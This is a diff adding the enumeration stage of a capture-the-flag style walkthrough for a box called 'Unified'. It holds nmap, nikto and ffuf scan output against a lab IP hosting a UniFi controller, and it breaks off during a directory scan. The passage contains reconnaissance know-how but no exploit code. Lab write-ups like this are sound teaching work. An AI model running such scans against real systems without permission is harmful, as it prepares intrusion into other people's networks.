@@ -5062,3 +5062,1146 @@ We then used sqpmap to perform a sql injectiom, which gave us shell access to th
 
 
 [Table of Contents](#table-of-contents)
+
+## Level 4: Unified
+
+### Scope
+
+The first step is listing the available information given in this scenario. We can define this setup as a grey-box, since we have been given partial information about the server. The following information is what we know about the scenario:
+
+| # | 	Description 	| Value |
+| :-----------: | :-----------: | :-----------: |
+| 1 | 	IP Address   |    	10.129.96.149   | 
+
+### Enumeration
+
+Given the overall scope of the scenario, we can now begin the enumeration process. We have been given an IP address of the machine, so we can start initiating a port scan using nmap.
+
+For this attempt, we will use an NMAP automator script to make out job easier. This script will handle pings, port scans, directory busting, and vulnerability analysis of the target server. The results of the scan are:
+
+```
+└─$ ./nmapAutomator.sh --host 10.129.96.149 --type All
+
+Running all scans on 10.129.96.149
+
+Host is likely running Linux
+
+
+---------------------Starting Port Scan-----------------------
+
+
+
+PORT     STATE SERVICE
+22/tcp   open  ssh
+6789/tcp open  ibm-db2-admin
+8080/tcp open  http-proxy
+8443/tcp open  https-alt
+
+
+
+---------------------Starting Script Scan-----------------------
+                                                                                                                                                                  
+
+
+PORT     STATE SERVICE         VERSION
+22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
+|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
+|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
+6789/tcp open  ibm-db2-admin?
+8080/tcp open  http-proxy
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.1 404 
+|     Content-Type: text/html;charset=utf-8
+|     Content-Language: en
+|     Content-Length: 431
+|     Date: Sun, 31 Jul 2022 15:19:29 GMT
+|     Connection: close
+|     <!doctype html><html lang="en"><head><title>HTTP Status 404 
+|     Found</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 404 
+|     Found</h1></body></html>
+|   GetRequest, HTTPOptions: 
+|     HTTP/1.1 302 
+|     Location: http://localhost:8080/manage
+|     Content-Length: 0
+|     Date: Sun, 31 Jul 2022 15:19:27 GMT
+|     Connection: close
+|   RTSPRequest: 
+|     HTTP/1.1 400 
+|     Content-Type: text/html;charset=utf-8
+|     Content-Language: en
+|     Content-Length: 435
+|     Date: Sun, 31 Jul 2022 15:19:27 GMT
+|     Connection: close
+|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
+|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
+|     Request</h1></body></html>
+|   Socks5: 
+|     HTTP/1.1 400 
+|     Content-Type: text/html;charset=utf-8
+|     Content-Language: en
+|     Content-Length: 435
+|     Date: Sun, 31 Jul 2022 15:19:29 GMT
+|     Connection: close
+|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
+|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
+|_    Request</h1></body></html>
+|_http-title: Did not follow redirect to https://10.129.96.149:8443/manage
+|_http-open-proxy: Proxy might be redirecting requests
+8443/tcp open  ssl/nagios-nsca Nagios NSCA
+| http-title: UniFi Network
+|_Requested resource was /manage/account/login?redirect=%2Fmanage
+| ssl-cert: Subject: commonName=UniFi/organizationName=Ubiquiti Inc./stateOrProvinceName=New York/countryName=US
+| Subject Alternative Name: DNS:UniFi
+| Not valid before: 2021-12-30T21:37:24
+|_Not valid after:  2024-04-03T21:37:24
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+
+
+---------------------Starting Full Scan------------------------
+                                                                                                                                                                  
+
+
+PORT     STATE SERVICE
+22/tcp   open  ssh
+6789/tcp open  ibm-db2-admin
+8080/tcp open  http-proxy
+8443/tcp open  https-alt
+8843/tcp open  unknown
+8880/tcp open  cddbp-alt
+
+
+
+Making a script scan on extra ports: 8843, 8880
+                                                                                                                                                                  
+
+
+PORT     STATE SERVICE     VERSION
+8843/tcp open  ssl/unknown
+| fingerprint-strings: 
+|   GetRequest: 
+|     HTTP/1.1 400 
+|     Content-Type: text/html;charset=utf-8
+|     Content-Language: en
+|     Content-Length: 435
+|     Date: Sun, 31 Jul 2022 15:25:02 GMT
+|     Connection: close
+|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
+|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
+|     Request</h1></body></html>
+|   HTTPOptions, RTSPRequest: 
+|     HTTP/1.1 400 
+|     Content-Type: text/html;charset=utf-8
+|     Content-Language: en
+|     Content-Length: 435
+|     Date: Sun, 31 Jul 2022 15:25:04 GMT
+|     Connection: close
+|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
+|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
+|_    Request</h1></body></html>
+| ssl-cert: Subject: commonName=UniFi/organizationName=Ubiquiti Inc./stateOrProvinceName=New York/countryName=US
+| Subject Alternative Name: DNS:UniFi
+| Not valid before: 2021-12-30T21:37:24
+|_Not valid after:  2024-04-03T21:37:24
+8880/tcp open  cddbp-alt?
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.1 404 
+|     Content-Type: text/html;charset=utf-8
+|     Content-Language: en
+|     Content-Length: 431
+|     Date: Sun, 31 Jul 2022 15:24:42 GMT
+|     Connection: close
+|     <!doctype html><html lang="en"><head><title>HTTP Status 404 
+|     Found</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 404 
+|     Found</h1></body></html>
+|   GetRequest: 
+|     HTTP/1.1 400 
+|     Content-Type: text/html;charset=utf-8
+|     Content-Language: en
+|     Content-Length: 435
+|     Date: Sun, 31 Jul 2022 15:24:42 GMT
+|     Connection: close
+|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
+|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
+|     Request</h1></body></html>
+|   HTTPOptions: 
+|     HTTP/1.1 400 
+|     Content-Type: text/html;charset=utf-8
+|     Content-Language: en
+|     Content-Length: 435
+|     Date: Sun, 31 Jul 2022 15:24:48 GMT
+|     Connection: close
+|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
+|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
+|_    Request</h1></body></html>
+2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+
+
+
+
+----------------------Starting UDP Scan------------------------
+                                                                                                                                                                  
+UDP needs to be run as root, running with sudo...
+[sudo] password for kali: 
+
+In progress: No Scan (0:00:00 elapsed - 0:00:00 remaining)   
+              In progress: No Scan (0:00:00 elapsed - 0:00:00 remaining)                                                                                            ] 0% done                 In progress: UDP Scan (0:00:03 elapsed - 0:01:25 remaining)                                                                                           ] 0% done                 In progress: UDP Scan (0:00:06 elapsed - 0:01:25 remaining)                                                                                           ] 3% done                 In progress: UDP Scan (0:00:09 elapsed - 0:01:48 remaining)                                                                                           ] 5% done                 In progress: UDP Scan (0:00:12 elapsed - 0:01:26 remaining)                                                                                           ] 6% done                  In progress: UDP Scan (0:00:18 elapsed - 0:00:49 remaining)                                                                                          ] 12% done                  In progress: UDP Scan (0:00:21 elapsed - 0:00:35 remaining)   ###########>                                                                           ] 25% done                  In progress: UDP Scan (0:00:24 elapsed - 0:00:23 remaining)   ######################>                                                                ] 36% done                  In progress: UDP Scan (0:00:27 elapsed - 0:00:14 remaining)   ####################################>                                                  ] 50% done                  In progress: UDP Scan (0:00:30 elapsed - 0:00:12 remaining)   ###################################################>                                   ] 65% done                  In progress: UDP Scan (0:00:33 elapsed - 0:00:11 remaining)   #########################################################>                             ] 71% done   
+             In progress: UDP Scan (0:00:36 elapsed - 0:00:11 remaining)   ############################################################>                          ] 74% done                  In progress: UDP Scan (0:00:39 elapsed - 0:00:10 remaining)   ##############################################################>                        ] 76% done                  In progress: UDP Scan (0:00:42 elapsed - 0:00:09 remaining)   #################################################################>                     ] 79% done                  In progress: UDP Scan (0:00:45 elapsed - 0:00:08 remaining)   ####################################################################>                  ] 82% done                  In progress: UDP Scan (0:00:48 elapsed - 0:00:06 remaining)   #######################################################################>               ] 85% done                  In progress: UDP Scan (0:00:51 elapsed - 0:00:05 remaining)   ##########################################################################>            ] 88% done                  In progress: UDP Scan (0:00:54 elapsed - 0:00:04 remaining)   ############################################################################>          ] 90% done                  In progress: UDP Scan (0:00:57 elapsed - 0:00:02 remaining)   ###############################################################################>       ] 93% done                  In progress: UDP Scan (0:01:00 elapsed - 0:00:01 remaining)   ##################################################################################>    ] 96% done                  In progress: UDP Scan (0:01:03 elapsed - 0:00:00 remaining)   ####################################################################################>  ] 98% done   
+ 
+
+
+
+No UDP ports are open
+                                                                                                                                                                  
+
+
+
+---------------------Starting Vulns Scan-----------------------
+                                                                                                                                                                  
+Running CVE scan on all ports
+                                                                                                                                                                  
+
+
+PORT     STATE SERVICE         VERSION
+22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| vulners: 
+|   cpe:/a:openbsd:openssh:8.2p1: 
+|       C94132FD-1FA5-5342-B6EE-0DAF45EEFFE3    6.8     https://vulners.com/githubexploit/C94132FD-1FA5-5342-B6EE-0DAF45EEFFE3  *EXPLOIT*
+|_      10213DBE-F683-58BB-B6D3-353173626207    6.8     https://vulners.com/githubexploit/10213DBE-F683-58BB-B6D3-353173626207  *EXPLOIT*
+6789/tcp open  ibm-db2-admin?
+8080/tcp open  http-proxy
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.1 404 
+|     Content-Type: text/html;charset=utf-8
+|     Content-Language: en
+|     Content-Length: 431
+|     Date: Sun, 31 Jul 2022 15:33:02 GMT
+|     Connection: close
+|     <!doctype html><html lang="en"><head><title>HTTP Status 404 
+|     Found</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 404 
+|     Found</h1></body></html>
+|   GetRequest, HTTPOptions: 
+|     HTTP/1.1 302 
+|     Location: http://localhost:8080/manage
+|     Content-Length: 0
+|     Date: Sun, 31 Jul 2022 15:33:01 GMT
+|     Connection: close
+|   RTSPRequest: 
+|     HTTP/1.1 400 
+|     Content-Type: text/html;charset=utf-8
+|     Content-Language: en
+|     Content-Length: 435
+|     Date: Sun, 31 Jul 2022 15:33:01 GMT
+|     Connection: close
+|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
+|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
+|     Request</h1></body></html>
+|   Socks5: 
+|     HTTP/1.1 400 
+|     Content-Type: text/html;charset=utf-8
+|     Content-Language: en
+|     Content-Length: 435
+|     Date: Sun, 31 Jul 2022 15:33:02 GMT
+|     Connection: close
+|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
+|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
+|_    Request</h1></body></html>
+8443/tcp open  ssl/nagios-nsca Nagios NSCA
+8843/tcp open  ssl/unknown
+| fingerprint-strings: 
+|   GetRequest, HTTPOptions: 
+|     HTTP/1.1 400 
+|     Content-Type: text/html;charset=utf-8
+|     Content-Language: en
+|     Content-Length: 435
+|     Date: Sun, 31 Jul 2022 15:33:22 GMT
+|     Connection: close
+|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
+|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
+|     Request</h1></body></html>
+|   RTSPRequest: 
+|     HTTP/1.1 400 
+|     Content-Type: text/html;charset=utf-8
+|     Content-Language: en
+|     Content-Length: 435
+|     Date: Sun, 31 Jul 2022 15:33:24 GMT
+|     Connection: close
+|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
+|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
+|_    Request</h1></body></html>
+8880/tcp open  cddbp-alt?
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.1 404 
+|     Content-Type: text/html;charset=utf-8
+|     Content-Language: en
+|     Content-Length: 431
+|     Date: Sun, 31 Jul 2022 15:33:02 GMT
+|     Connection: close
+|     <!doctype html><html lang="en"><head><title>HTTP Status 404 
+|     Found</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 404 
+|     Found</h1></body></html>
+|   GetRequest: 
+|     HTTP/1.1 400 
+|     Content-Type: text/html;charset=utf-8
+|     Content-Language: en
+|     Content-Length: 435
+|     Date: Sun, 31 Jul 2022 15:33:01 GMT
+|     Connection: close
+|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
+|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
+|     Request</h1></body></html>
+|   HTTPOptions: 
+|     HTTP/1.1 400 
+|     Content-Type: text/html;charset=utf-8
+|     Content-Language: en
+|     Content-Length: 435
+|     Date: Sun, 31 Jul 2022 15:33:08 GMT
+|     Connection: close
+|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
+|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
+|_    Request</h1></body></html>
+3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+
+Running Vuln scan on all ports
+This may take a while, depending on the number of detected services..                                                                                             
+                                                                                                                                                                  
+
+
+PORT     STATE SERVICE         VERSION
+22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| vulners: 
+|   cpe:/a:openbsd:openssh:8.2p1: 
+|       CVE-2020-15778  6.8     https://vulners.com/cve/CVE-2020-15778
+|       C94132FD-1FA5-5342-B6EE-0DAF45EEFFE3    6.8     https://vulners.com/githubexploit/C94132FD-1FA5-5342-B6EE-0DAF45EEFFE3  *EXPLOIT*
+|       10213DBE-F683-58BB-B6D3-353173626207    6.8     https://vulners.com/githubexploit/10213DBE-F683-58BB-B6D3-353173626207  *EXPLOIT*
+|       CVE-2020-12062  5.0     https://vulners.com/cve/CVE-2020-12062
+|       CVE-2021-28041  4.6     https://vulners.com/cve/CVE-2021-28041
+|       CVE-2021-41617  4.4     https://vulners.com/cve/CVE-2021-41617
+|       CVE-2020-14145  4.3     https://vulners.com/cve/CVE-2020-14145
+|       CVE-2016-20012  4.3     https://vulners.com/cve/CVE-2016-20012
+|_      CVE-2021-36368  2.6     https://vulners.com/cve/CVE-2021-36368
+8080/tcp open  http-proxy
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.1 404 
+|     Content-Type: text/html;charset=utf-8
+|     Content-Language: en
+|     Content-Length: 431
+|     Date: Sun, 31 Jul 2022 15:34:50 GMT
+|     Connection: close
+|     <!doctype html><html lang="en"><head><title>HTTP Status 404 
+|     Found</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 404 
+|     Found</h1></body></html>
+|   GetRequest, HTTPOptions: 
+|     HTTP/1.1 302 
+|     Location: http://localhost:8080/manage
+|     Content-Length: 0
+|     Date: Sun, 31 Jul 2022 15:34:49 GMT
+|     Connection: close
+|   RTSPRequest: 
+|     HTTP/1.1 400 
+|     Content-Type: text/html;charset=utf-8
+|     Content-Language: en
+|     Content-Length: 435
+|     Date: Sun, 31 Jul 2022 15:34:49 GMT
+|     Connection: close
+|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
+|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
+|     Request</h1></body></html>
+|   Socks5: 
+|     HTTP/1.1 400 
+|     Content-Type: text/html;charset=utf-8
+|     Content-Language: en
+|     Content-Length: 435
+|     Date: Sun, 31 Jul 2022 15:34:50 GMT
+|     Connection: close
+|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
+|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
+|_    Request</h1></body></html>
+8443/tcp open  ssl/nagios-nsca Nagios NSCA
+8843/tcp open  ssl/unknown
+| fingerprint-strings: 
+|   GetRequest, HTTPOptions: 
+|     HTTP/1.1 400 
+|     Content-Type: text/html;charset=utf-8
+|     Content-Language: en
+|     Content-Length: 435
+|     Date: Sun, 31 Jul 2022 15:35:11 GMT
+|     Connection: close
+|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
+|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
+|     Request</h1></body></html>
+|   RTSPRequest: 
+|     HTTP/1.1 400 
+|     Content-Type: text/html;charset=utf-8
+|     Content-Language: en
+|     Content-Length: 435
+|     Date: Sun, 31 Jul 2022 15:35:12 GMT
+|     Connection: close
+|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
+|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
+|_    Request</h1></body></html>
+8880/tcp open  cddbp-alt?
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.1 404 
+|     Content-Type: text/html;charset=utf-8
+|     Content-Language: en
+|     Content-Length: 431
+|     Date: Sun, 31 Jul 2022 15:34:49 GMT
+|     Connection: close
+|     <!doctype html><html lang="en"><head><title>HTTP Status 404 
+|     Found</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 404 
+|     Found</h1></body></html>
+|   GetRequest: 
+|     HTTP/1.1 400 
+|     Content-Type: text/html;charset=utf-8
+|     Content-Language: en
+|     Content-Length: 435
+|     Date: Sun, 31 Jul 2022 15:34:49 GMT
+|     Connection: close
+|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
+|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
+|     Request</h1></body></html>
+|   HTTPOptions: 
+|     HTTP/1.1 400 
+|     Content-Type: text/html;charset=utf-8
+|     Content-Language: en
+|     Content-Length: 435
+|     Date: Sun, 31 Jul 2022 15:34:56 GMT
+|     Connection: close
+|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
+|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
+|_    Request</h1></body></html>
+3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+
+
+---------------------Recon Recommendations---------------------
+                                                                                                                                                                  
+
+Web Servers Recon:
+                                                                                                                                                                  
+nikto -host "http://10.129.96.149:8080" | tee "recon/nikto_10.129.96.149_8080.txt"
+ffuf -ic -w /usr/share/wordlists/dirb/common.txt -e '' -u "http://10.129.96.149:8080/FUZZ" | tee "recon/ffuf_10.129.96.149_8080.txt"
+
+nikto -host "http://10.129.96.149:|_http-open-proxy: Proxy might be redirecting requests" | tee "recon/nikto_10.129.96.149_|_http-open-proxy: Proxy might be redirecting requests.txt"
+ffuf -ic -w /usr/share/wordlists/dirb/common.txt -e '' -u "http://10.129.96.149:|_http-open-proxy: Proxy might be redirecting requests/FUZZ" | tee "recon/ffuf_10.129.96.149_|_http-open-proxy: Proxy might be redirecting requests.txt"
+
+
+
+
+
+Which commands would you like to run?                                                                                                                             
+All (Default), ffuf, nikto, Skip <!>
+
+Running Default in (1)s: 
+
+
+---------------------Running Recon Commands--------------------
+                                                                                                                                                                  
+
+Starting nikto scan
+                                                                                                                                                                  
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          10.129.96.149
++ Target Hostname:    10.129.96.149
++ Target Port:        8080
++ Start Time:         2022-07-31 11:52:25 (GMT-4)
+---------------------------------------------------------------------------
++ Server: No banner retrieved
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ Root page / redirects to: /manage
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS 
++ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
++ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
++ 7918 requests: 0 error(s) and 6 item(s) reported on remote host
++ End Time:           2022-07-31 12:11:21 (GMT-4) (1136 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+Finished nikto scan
+                                                                                                                                                                  
+=========================
+                                                                                                                                                                  
+Starting ffuf scan
+                                                                                                                                                                  
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.5.0 Kali Exclusive <3
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.129.96.149:8080/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
+________________________________________________
+
+                        [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 110ms]
+api                     [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 76ms]
+diag                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 71ms]
+file                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 81ms]
+logout                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 105ms]
+manage                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 111ms]
+op                      [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 73ms]
+pages                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 119ms]
+print                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 78ms]
+setup                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 75ms]
+status                  [Status: 200, Size: 76, Words: 1, Lines: 1, Duration: 136ms]
+upload                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 75ms]
+v2                      [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 106ms]
+wss                     [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 76ms]
+:: Progress: [4614/4614] :: Job [1/1] :: 427 req/sec :: Duration: [0:00:10] :: Errors: 0 ::
+
+Finished ffuf scan
+                                                                                                                                                                  
+=========================
+                                                                                                                                                                  
+Starting nikto scan
+                                                                                                                                                                  
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ ERROR: SKIPPORTS (nikto.conf) contains |_http-open-proxy -- not checking
++ 0 host(s) tested
+
+Finished nikto scan
+                                                                                                                                                                  
+=========================
+                                                                                                                                                                  
+Starting ffuf scan
+                                                                                                                                                                  
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.5.0 Kali Exclusive <3
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.129.96.149:|_http-open-proxy: Proxy might be redirecting requests/FUZZ
